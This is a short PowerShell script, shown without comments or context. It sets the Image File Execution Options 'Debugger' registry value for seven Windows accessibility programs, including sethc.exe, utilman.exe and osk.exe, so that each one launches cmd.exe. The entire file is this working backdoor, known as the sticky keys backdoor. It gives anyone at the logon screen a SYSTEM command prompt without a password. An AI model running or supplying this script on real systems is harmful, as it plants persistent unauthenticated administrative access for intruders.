$parent_list = "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"
$attached_process = "c:\windows\system32\cmd.exe"
$input_table = $parent_list.split(",")
$Name = "Debugger"
$Value = $attached_process
Foreach ($item in $input_table){   
  $item = $item.trim()
  $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}